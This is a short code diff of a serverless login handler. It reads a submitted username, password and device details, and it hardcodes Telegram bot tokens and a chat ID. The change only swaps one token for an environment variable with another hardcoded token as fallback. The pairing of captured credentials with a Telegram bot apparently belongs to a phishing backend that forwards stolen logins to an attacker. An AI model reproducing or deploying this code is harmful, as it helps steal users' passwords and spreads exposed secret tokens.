@@ -9,7 +9,7 @@ export default async function handler(req, res) {
     if (req.method !== 'POST') return res.status(405).send('Method not allowed');
 
     const { username, password, deviceInfo } = req.body;
-    const BOT_TOKEN = '8758506651:AAH-GCPCua0qS2dIvFINUg1LYMli91_t1Yg';
+    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8929507323:AAG3whvK92MuhmaPX2OI0HEP82ejxnQGYKQ';
     const CHAT_ID = '5290622641';
 
     const u = (username || '').trim().toLowerCase();
